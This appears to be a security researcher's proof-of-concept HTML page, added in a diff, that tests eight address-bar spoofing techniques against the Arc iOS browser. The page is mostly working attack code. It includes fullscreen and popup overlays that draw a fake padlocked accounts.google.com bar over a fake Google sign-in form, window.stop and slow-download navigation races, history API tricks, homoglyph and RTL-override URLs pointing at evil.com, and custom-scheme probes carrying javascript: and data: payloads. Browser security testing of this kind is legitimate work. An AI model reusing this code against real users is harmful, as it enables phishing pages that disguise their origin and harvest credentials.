@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Arc iOS Address Bar Spoof Tests</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #0d1117; color: #c9d1d9; }
+.header { background: #161b22; padding: 15px; border-bottom: 1px solid #30363d; }
+h1 { font-size: 18px; color: #58a6ff; }
+.subtitle { font-size: 12px; color: #8b949e; margin-top: 4px; }
+.tests { padding: 15px; }
+.test-card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; margin-bottom: 12px; padding: 15px; }
+.test-id { color: #f0883e; font-weight: bold; font-size: 14px; }
+.test-desc { color: #8b949e; font-size: 12px; margin: 6px 0; }
+.test-tech { color: #7ee787; font-size: 11px; font-family: monospace; background: #0d1117; padding: 4px 8px; border-radius: 4px; display: inline-block; margin: 4px 0; }
+button { background: #238636; color: white; border: none; padding: 10px 20px; border-radius: 6px; font-size: 14px; width: 100%; margin-top: 8px; cursor: pointer; }
+button:active { background: #2ea043; }
+button.orange { background: #d29922; }
+button.red { background: #da3633; }
+.status { margin-top: 8px; padding: 8px; border-radius: 4px; font-size: 12px; display: none; }
+.status.show { display: block; }
+.warn { color: #f0883e; font-size: 11px; margin-top: 6px; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>Arc iOS Address Bar Spoof Tests</h1>
+  <div class="subtitle">8 techniques based on Opera research by Renwa — adapted for Arc Browser iOS</div>
+</div>
+
+<div class="tests">
+
+<!-- ============================================ -->
+<!-- TEST A: Fullscreen Spoof (Opera Bug #7 style) -->
+<!-- ============================================ -->
+<div class="test-card">
+  <div class="test-id">A — Fullscreen + Fake Address Bar</div>
+  <div class="test-desc">Enter fullscreen via Fullscreen API, overlay a fake Arc address bar. If Arc doesn't show a "fullscreen" warning, victim sees fake URL.</div>
+  <div class="test-tech">Technique: requestFullscreen() + CSS overlay</div>
+  <button onclick="testFullscreen()">Launch Test A</button>
+  <div class="warn">Tap anywhere on fake address bar to exit</div>
+</div>
+
+<!-- ============================================ -->
+<!-- TEST B: window.stop() Race (Zellic technique) -->
+<!-- ============================================ -->
+<div class="test-card">
+  <div class="test-id">B — Navigation Race (window.stop)</div>
+  <div class="test-desc">Navigate to target URL then immediately call window.stop(). Address bar may update to target while page content stays on attacker page.</div>
+  <div class="test-tech">Technique: location.href + window.stop()</div>
+  <button onclick="testWindowStop()">Launch Test B</button>
+</div>
+
+<!-- ============================================ -->
+<!-- TEST C: Slow Response Freeze (Opera Bug #4 style) -->
+<!-- ============================================ -->
+<div class="test-card">
+  <div class="test-id">C — Slow Navigation Freeze</div>
+  <div class="test-desc">Navigate to a very large file download. Address bar updates to target URL but page stays on attacker content because response is incomplete.</div>
+  <div class="test-tech">Technique: Navigate to large file / slow endpoint</div>
+  <button onclick="testSlowNav()">Launch Test C</button>
+</div>
+
+<!-- ============================================ -->
+<!-- TEST D: History API Spoof -->
+<!-- ============================================ -->
+<div class="test-card">
+  <div class="test-id">D — History API Manipulation</div>
+  <div class="test-desc">Use history.pushState/replaceState to change displayed URL. Should be blocked cross-origin, but test edge cases.</div>
+  <div class="test-tech">Technique: history.pushState() / replaceState()</div>
+  <button onclick="testHistoryAPI()">Launch Test D</button>
+  <div id="statusD" class="status"></div>
+</div>
+
+<!-- ============================================ -->
+<!-- TEST E: Unicode / RTL Confusion (Opera Bug #6 style) -->
+<!-- ============================================ -->
+<div class="test-card">
+  <div class="test-id">E — Unicode / RTL Address Bar Confusion</div>
+  <div class="test-desc">Use Right-to-Left override characters and homoglyphs to make address bar show misleading URL.</div>
+  <div class="test-tech">Technique: RTL override (U+202E) + homoglyphs</div>
+  <button onclick="testUnicode()">Launch Test E</button>
+  <div id="statusE" class="status"></div>
+</div>
+
+<!-- ============================================ -->
+<!-- TEST F: window.open Popup Spoof (Opera Bug #2/#5 style) -->
+<!-- ============================================ -->
+<div class="test-card">
+  <div class="test-id">F — Popup Window Without Address Bar</div>
+  <div class="test-desc">Open popup window that may lack address bar on some browsers. Create fake address bar with CSS/HTML inside it.</div>
+  <div class="test-tech">Technique: window.open() with popup features</div>
+  <button onclick="testPopup()">Launch Test F</button>
+</div>
+
+<!-- ============================================ -->
+<!-- TEST G: Blob URL Spoof -->
+<!-- ============================================ -->
+<div class="test-card">
+  <div class="test-id">G — Blob URL with Fake UI</div>
+  <div class="test-desc">Create blob URL containing full phishing page with fake address bar. Blob URLs show "blob:" in address bar which may be truncated on mobile.</div>
+  <div class="test-tech">Technique: URL.createObjectURL(blob)</div>
+  <button onclick="testBlobURL()">Launch Test G</button>
+</div>
+
+<!-- ============================================ -->
+<!-- TEST H: Deep Link / Custom Scheme -->
+<!-- ============================================ -->
+<div class="test-card">
+  <div class="test-id">H — Arc Custom Scheme Probing</div>
+  <div class="test-desc">Test various Arc-specific URL schemes. If Arc has deep links that handle URL parameters, may be exploitable like Opera's intent:// bug.</div>
+  <div class="test-tech">Technique: Custom URI scheme probing</div>
+  <button class="orange" onclick="testDeepLinks()">Launch Test H</button>
+  <div id="statusH" class="status"></div>
+</div>
+
+</div>
+
+<script>
+// ============================================
+// Fake Arc Address Bar Component (reused across tests)
+// ============================================
+function createFakeArcBar(targetUrl, content) {
+  // Remove previous overlay
+  let old = document.getElementById('spoof-overlay');
+  if (old) old.remove();
+
+  let overlay = document.createElement('div');
+  overlay.id = 'spoof-overlay';
+  overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;background:#fff;';
+
+  // Fake iOS status bar
+  let statusBar = document.createElement('div');
+  statusBar.style.cssText = 'height:54px;background:#fff;display:flex;align-items:center;justify-content:space-between;padding:0 20px;font-size:14px;font-weight:600;font-family:-apple-system,sans-serif;color:#000;';
+  statusBar.innerHTML = '<span>9:41</span><span style="display:flex;gap:5px;align-items:center;"><span style="font-size:12px;">5G</span><span>&#x1F50B;</span></span>';
+
+  // Fake Arc address bar
+  let addressBar = document.createElement('div');
+  addressBar.style.cssText = 'height:44px;background:#f2f2f7;margin:0 12px;border-radius:10px;display:flex;align-items:center;padding:0 12px;font-size:15px;color:#000;font-family:-apple-system,sans-serif;';
+
+  // Lock icon + URL
+  let lockIcon = '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#34c759" stroke-width="3"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>';
+  addressBar.innerHTML = lockIcon + '&nbsp;&nbsp;<span style="color:#000;cursor:text;">' + targetUrl + '</span>';
+
+  // Content area
+  let contentArea = document.createElement('div');
+  contentArea.style.cssText = 'flex:1;overflow-y:auto;background:#fff;';
+  contentArea.innerHTML = content;
+
+  overlay.appendChild(statusBar);
+  overlay.appendChild(addressBar);
+  overlay.appendChild(contentArea);
+
+  // Exit on address bar tap
+  addressBar.addEventListener('click', function() {
+    overlay.remove();
+    if (document.fullscreenElement) document.exitFullscreen();
+  });
+
+  return overlay;
+}
+
+// Fake login page content
+function fakeLoginPage(domain) {
+  return '<div style="font-family:-apple-system,sans-serif;max-width:400px;margin:60px auto;padding:20px;text-align:center;">' +
+    '<div style="width:60px;height:60px;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:15px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;">' +
+    '<span style="color:white;font-size:28px;font-weight:bold;">A</span></div>' +
+    '<h2 style="color:#1d1d1f;margin-bottom:8px;">Sign in to ' + domain + '</h2>' +
+    '<p style="color:#86868b;font-size:14px;margin-bottom:30px;">Enter your credentials to continue</p>' +
+    '<input type="email" placeholder="Email" style="width:100%;padding:12px 16px;border:1px solid #d2d2d7;border-radius:8px;font-size:16px;margin-bottom:12px;outline:none;">' +
+    '<input type="password" placeholder="Password" style="width:100%;padding:12px 16px;border:1px solid #d2d2d7;border-radius:8px;font-size:16px;margin-bottom:20px;outline:none;">' +
+    '<button style="width:100%;padding:12px;background:#007aff;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;">Sign In</button>' +
+    '<p style="color:#007aff;font-size:13px;margin-top:15px;cursor:pointer;">Forgot password?</p>' +
+    '</div>';
+}
+
+
+// ============================================
+// TEST A: Fullscreen Spoof
+// ============================================
+function testFullscreen() {
+  let overlay = createFakeArcBar('accounts.google.com', fakeLoginPage('Google'));
+
+  // Try fullscreen first, then show overlay
+  let elem = document.documentElement;
+  let fsPromise;
+
+  if (elem.requestFullscreen) fsPromise = elem.requestFullscreen();
+  else if (elem.webkitRequestFullscreen) fsPromise = elem.webkitRequestFullscreen();
+
+  function showOverlay() {
+    document.body.appendChild(overlay);
+  }
+
+  if (fsPromise && fsPromise.then) {
+    fsPromise.then(showOverlay).catch(function() {
+      // Fullscreen denied, show overlay anyway for testing
+      showOverlay();
+    });
+  } else {
+    // Fallback: show overlay without fullscreen
+    setTimeout(showOverlay, 100);
+  }
+}
+
+
+// ============================================
+// TEST B: window.stop() Race
+// ============================================
+function testWindowStop() {
+  // Open new window to preserve this page
+  let w = window.open('', '_blank');
+  if (!w) { alert('Popup blocked — allow popups and retry'); return; }
+
+  w.document.write('<html><head><meta name="viewport" content="width=device-width,initial-scale=1"></head><body>' +
+    '<h2 style="font-family:sans-serif;text-align:center;padding:40px;">Preparing...</h2>' +
+    '<script>' +
+    'setTimeout(function(){' +
+    '  window.location.href = "https://accounts.google.com/signin";' +
+    '  window.stop();' +
+    '  document.body.innerHTML = \'<div style=\"font-family:-apple-system,sans-serif;max-width:400px;margin:80px auto;text-align:center;padding:20px;\">' +
+    '    <h2>Address bar shows accounts.google.com?</h2>' +
+    '    <p style=\"color:#666;margin:15px 0;\">If YES = address bar spoofed while content is attacker-controlled</p>' +
+    '    <p style=\"color:#666;\">If NO = browser correctly prevented the spoof</p></div>\';' +
+    '}, 500);' +
+    '<\/script></body></html>');
+  w.document.close();
+}
+
+
+// ============================================
+// TEST C: Slow Navigation Freeze
+// ============================================
+function testSlowNav() {
+  let w = window.open('', '_blank');
+  if (!w) { alert('Popup blocked — allow popups and retry'); return; }
+
+  w.document.write('<html><head><meta name="viewport" content="width=device-width,initial-scale=1"></head><body>' +
+    '<div id="content" style="font-family:-apple-system,sans-serif;max-width:400px;margin:60px auto;text-align:center;padding:20px;">' +
+    '<h2>Step 1: Content loaded</h2>' +
+    '<p style="color:#666;">In 2 seconds, navigating to large file on google.com...</p>' +
+    '<p style="color:#666;">Address bar should change but page content should freeze here.</p></div>' +
+    '<script>' +
+    'setTimeout(function(){' +
+    // Navigate to a deliberately slow/large resource
+    '  var a = document.createElement("a");' +
+    '  a.href = "https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb";' +
+    '  a.click();' +
+    '  document.getElementById("content").innerHTML = ' +
+    '    "<h2 style=\\"color:green\\">Step 2: Navigation initiated</h2>" +' +
+    '    "<p>Check address bar — does it show google.com domain?</p>" +' +
+    '    "<p>If content stays visible AND address bar changed = SPOOFED</p>";' +
+    '}, 2000);' +
+    '<\/script></body></html>');
+  w.document.close();
+}
+
+
+// ============================================
+// TEST D: History API
+// ============================================
+function testHistoryAPI() {
+  let s = document.getElementById('statusD');
+  s.className = 'status show';
+  let results = [];
+
+  // Test 1: pushState same-origin path change
+  try {
+    history.pushState({}, '', '/accounts/google/signin');
+    results.push('pushState path change: SUCCESS — check address bar');
+    history.back();
+  } catch(e) {
+    results.push('pushState path change: BLOCKED — ' + e.message);
+  }
+
+  // Test 2: pushState cross-origin (should fail)
+  try {
+    history.pushState({}, '', 'https://accounts.google.com/');
+    results.push('pushState cross-origin: SUCCESS — VULNERABLE!');
+  } catch(e) {
+    results.push('pushState cross-origin: BLOCKED (expected)');
+  }
+
+  // Test 3: replaceState with long path
+  try {
+    history.replaceState({}, '', '/' + 'accounts.google.com'.repeat(5));
+    results.push('replaceState long path: SUCCESS — may truncate to look like google.com');
+    history.back();
+  } catch(e) {
+    results.push('replaceState long: BLOCKED — ' + e.message);
+  }
+
+  // Test 4: pushState with special chars
+  try {
+    history.pushState({}, '', '/\u2025accounts.google.com');
+    results.push('pushState unicode: SUCCESS — check if address bar is confusing');
+    history.back();
+  } catch(e) {
+    results.push('pushState unicode: BLOCKED');
+  }
+
+  s.style.background = '#161b22';
+  s.style.color = '#7ee787';
+  s.innerHTML = results.join('<br>');
+}
+
+
+// ============================================
+// TEST E: Unicode / RTL Confusion
+// ============================================
+function testUnicode() {
+  let s = document.getElementById('statusE');
+  s.className = 'status show';
+
+  // Various unicode trick URLs
+  let tricks = [
+    // RTL override
+    { url: 'https://google.com%E2%80%AE%2F%E2%80%AD.evil.com/', desc: 'RTL override (U+202E)' },
+    // Homoglyphs
+    { url: 'https://g\u043Cogle.com/', desc: 'Cyrillic "o" homoglyph' },
+    // Zero-width chars
+    { url: 'https://google\u200B.com.evil.com/', desc: 'Zero-width space in domain' },
+    // Punycode
+    { url: 'https://xn--ggle-55da.com/', desc: 'Punycode googlе (Cyrillic е)' },
+    // Long subdomain truncation
+    { url: 'https://accounts.google.com.security.login.verification.evil.com/', desc: 'Long subdomain truncation' },
+    // Arabic chars (Opera Bug #6)
+    { url: 'https://\u0633google.com/', desc: 'Arabic + Latin mix (Opera freeze technique)' }
+  ];
+
+  let html = '<div style="font-size:11px;">';
+  tricks.forEach(function(t, i) {
+    html += '<div style="margin:8px 0;padding:6px;background:#0d1117;border-radius:4px;">' +
+      '<div style="color:#f0883e;">' + t.desc + '</div>' +
+      '<div style="word-break:break-all;color:#58a6ff;margin:4px 0;">' + t.url.replace(/</g,'&lt;') + '</div>' +
+      '<a href="' + t.url + '" target="_blank" style="color:#238636;font-size:11px;">Open in new tab →</a>' +
+      '</div>';
+  });
+  html += '</div>';
+
+  s.style.background = '#161b22';
+  s.innerHTML = html;
+}
+
+
+// ============================================
+// TEST F: Popup Window Spoof
+// ============================================
+function testPopup() {
+  // Open minimal popup
+  let w = window.open('', 'spooftest',
+    'width=375,height=812,menubar=no,toolbar=no,location=no,status=no,scrollbars=yes');
+
+  if (!w) { alert('Popup blocked — allow popups and retry'); return; }
+
+  let html = '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">' +
+    '<style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:-apple-system,sans-serif;}</style></head><body>';
+
+  // Fake status bar
+  html += '<div style="height:54px;background:#fff;display:flex;align-items:center;justify-content:space-between;padding:0 20px;font-size:14px;font-weight:600;">' +
+    '<span>9:41</span><span>5G &#x1F50B;</span></div>';
+
+  // Fake address bar
+  html += '<div style="height:44px;background:#f2f2f7;margin:0 12px;border-radius:10px;display:flex;align-items:center;padding:0 12px;font-size:15px;">' +
+    '<span style="color:#34c759;">&#x1F512;</span>&nbsp;&nbsp;accounts.google.com</div>';
+
+  // Fake login
+  html += '<div style="max-width:400px;margin:60px auto;padding:20px;text-align:center;">' +
+    '<h2 style="color:#1d1d1f;margin-bottom:30px;">Sign in with Google</h2>' +
+    '<input type="email" placeholder="Email" style="width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;font-size:16px;margin-bottom:12px;">' +
+    '<input type="password" placeholder="Password" style="width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;font-size:16px;margin-bottom:20px;">' +
+    '<button style="width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:8px;font-size:16px;">Next</button>' +
+    '<p style="color:red;margin-top:30px;font-size:12px;">⚠ This is a spoof test — check if this window has a real address bar or not</p></div>';
+
+  html += '</body></html>';
+  w.document.write(html);
+  w.document.close();
+}
+
+
+// ============================================
+// TEST G: Blob URL Spoof
+// ============================================
+function testBlobURL() {
+  let html = '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">' +
+    '<style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:-apple-system,sans-serif;background:#fff;}</style></head><body>';
+
+  // Fake address bar at top
+  html += '<div style="position:fixed;top:0;left:0;right:0;z-index:9999;background:#fff;">';
+  html += '<div style="height:54px;background:#fff;display:flex;align-items:center;justify-content:space-between;padding:0 20px;font-size:14px;font-weight:600;">' +
+    '<span>9:41</span><span>5G &#x1F50B;</span></div>';
+  html += '<div style="height:44px;background:#f2f2f7;margin:0 12px;border-radius:10px;display:flex;align-items:center;padding:0 12px;font-size:15px;">' +
+    '<span style="color:#34c759;">&#x1F512;</span>&nbsp;&nbsp;accounts.google.com</div>';
+  html += '</div>';
+
+  // Login content
+  html += '<div style="margin-top:120px;max-width:400px;margin-left:auto;margin-right:auto;padding:20px;text-align:center;">' +
+    '<h2 style="color:#1d1d1f;margin-bottom:30px;">Sign in</h2>' +
+    '<input placeholder="Email" style="width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;font-size:16px;margin-bottom:12px;">' +
+    '<input type="password" placeholder="Password" style="width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;font-size:16px;margin-bottom:20px;">' +
+    '<button style="width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:8px;font-size:16px;">Sign In</button>' +
+    '<p style="color:red;margin-top:30px;font-size:11px;">⚠ This is blob: URL — check how Arc displays it in address bar.<br>Does it show "blob:" prefix or truncate it?</p></div>';
+
+  html += '</body></html>';
+
+  let blob = new Blob([html], { type: 'text/html' });
+  let url = URL.createObjectURL(blob);
+  window.open(url, '_blank');
+}
+
+
+// ============================================
+// TEST H: Deep Link / Custom Scheme Probing
+// ============================================
+function testDeepLinks() {
+  let s = document.getElementById('statusH');
+  s.className = 'status show';
+
+  let schemes = [
+    { url: 'arc://open?url=https://accounts.google.com', desc: 'arc://open?url=' },
+    { url: 'arc-search://accounts.google.com', desc: 'arc-search://' },
+    { url: 'arc://settings', desc: 'arc://settings' },
+    { url: 'arc://newtab', desc: 'arc://newtab' },
+    { url: 'arc://flags', desc: 'arc://flags' },
+    { url: 'arc://version', desc: 'arc://version' },
+    { url: 'arcgx://open?url=https://google.com', desc: 'arcgx://open' },
+    { url: 'arc-internal://open?url=data:text/html,<h1>XSS</h1>', desc: 'arc-internal + data URL' },
+    { url: 'arc://open?url=data://accounts.google.com/,Fake', desc: 'arc:// + data URL authority spoof' },
+    { url: 'arc://open?url=javascript:alert(document.domain)', desc: 'arc:// + javascript: scheme' },
+    { url: 'https://arc.net/.well-known/apple-app-site-association', desc: 'Universal Links config (read-only)' },
+  ];
+
+  let html = '<div style="font-size:11px;">';
+  html += '<div style="color:#f0883e;margin-bottom:8px;">Tap each link from Arc iOS. Note which ones:<br>- Open inside Arc<br>- Change address bar<br>- Show content</div>';
+
+  schemes.forEach(function(s) {
+    html += '<div style="margin:6px 0;padding:6px;background:#0d1117;border-radius:4px;">' +
+      '<div style="color:#8b949e;">' + s.desc + '</div>' +
+      '<a href="' + s.url + '" style="color:#58a6ff;word-break:break-all;font-size:10px;">' + s.url.replace(/</g,'&lt;') + '</a>' +
+      '</div>';
+  });
+
+  html += '</div>';
+  s.style.background = '#161b22';
+  s.innerHTML = html;
+}
+</script>
+
+</body>
+</html>
